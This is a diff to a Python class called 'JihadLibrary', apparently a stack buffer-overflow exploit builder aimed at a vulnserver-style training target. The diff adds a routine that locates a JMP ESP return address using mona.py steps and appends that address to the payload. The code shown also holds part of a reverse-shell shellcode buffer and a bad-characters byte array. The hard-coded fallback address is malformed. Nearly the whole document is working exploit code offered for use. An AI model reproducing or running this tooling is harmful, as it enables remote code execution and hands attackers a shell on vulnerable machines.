@@ -138,7 +138,8 @@ class JihadLibrary(object):
             else:
                 payload = payload.encode('ascii')
                 reverseShell = self.generateReverseShell()
-                
+                JMP_ESP = self.findJMP_ESP()
+                payload += JMP_ESP
                 payload += reverseShell
                 print(bytes(payload))
         # future update in sha allah
@@ -160,10 +161,24 @@ class JihadLibrary(object):
             if data.lower() == 'q':
                 s.close()
                 break
+    def findJMP_ESP(self):
+        # !mona modules
+        # 
+        JMP_ESP = input(colors.WARNING + """
+        Note: you can find the JMP_ESP through these step:
+        1. find the file name for example essfunc.dll
+        !mona modules
+        2. search for the esp
+        !mona find -s "\-xff\-xe4" -m essfunc.dll
+        3. write the character in backward and add \-x with out - for example 
+        this 625014DF will become "\-xdf\-x14\-x50\-62" with out -
+        What is the esp:
+        JMP_ESP
+        
+        """ + colors.END) or b"\xdf\x14\x50\62"
 
+        return  JMP_ESP #+ b"\x90" * 32
     def generateReverseShell(self):
-        # space to make sure that the shell will run
-        buf =  b"\xdf\x14\x50\62" #+ b"\x90" * 32
         # the shell
         buf =  b""
         buf += b"\xba\x8e\x7f\x34\xe6\xda\xc5\xd9\x74\x24\xf4\x58\x31\xc9"
@@ -195,7 +210,7 @@ class JihadLibrary(object):
         return (buf)
     
     def badChars():
-        char = (
+        character = (
             b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
             b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
             b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
@@ -213,7 +228,7 @@ class JihadLibrary(object):
             b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
             b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
             )
-        return char
+        return character
 class colors:
     HEADER = '\033[95m'
     OkBlue = '\033[94m'
